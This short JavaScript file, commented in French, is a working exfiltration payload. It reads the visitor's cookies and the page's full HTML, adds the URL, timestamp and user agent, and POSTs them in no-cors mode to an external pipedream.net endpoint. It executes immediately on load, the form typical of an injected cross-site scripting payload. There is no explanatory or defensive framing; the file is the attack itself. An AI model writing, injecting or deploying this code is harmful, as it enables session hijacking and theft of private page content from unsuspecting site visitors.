// Fonction pour récupérer les cookies
function grabCookies() {
    return document.cookie;
}

// Fonction pour récupérer tout le HTML de la page
function grabFullHTML() {
    return document.documentElement.outerHTML;
}

// Fonction pour envoyer les données au serveur
function sendDataToServer() {
    const cookies = grabCookies();
    const html = grabFullHTML();
    
    // Créer l'objet de données à envoyer
    const data = {
        cookies: cookies,
        html: html,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };
    
    // Envoyer les données via une requête POST
    fetch('https://eoppt5zj3no3twu.m.pipedream.net', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).catch(error => {
        console.error('Erreur lors de l\'envoi des données:', error);
    });
}

// Exécuter la fonction d'envoi
sendDataToServer();

